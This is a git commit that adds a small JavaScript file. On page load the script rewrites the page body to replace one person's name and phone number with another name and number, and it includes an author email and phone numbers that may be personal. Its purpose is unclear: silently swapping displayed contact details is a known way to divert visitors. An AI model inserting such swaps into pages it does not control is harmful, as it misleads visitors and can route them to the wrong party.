19cfc81929a2f253531bdf4c2fdde36625e87490
inggarfi <inggarsaput@gmail.com>
2025-06-10 10:42:04 +0700

    Create amib.js

---
+++ amib.js
@@ -0,0 +1,7 @@
+document.addEventListener("DOMContentLoaded", function () {
+    // Ganti semua "MULYANAH" jadi "Surwati"
+    document.body.innerHTML = document.body.innerHTML.replace(/MULYANAH/g, 'Surwati');
+
+    // Ganti semua "089630677982" jadi "088214538915"
+    document.body.innerHTML = document.body.innerHTML.replace(/089630677982/g, '088214538915');
+});
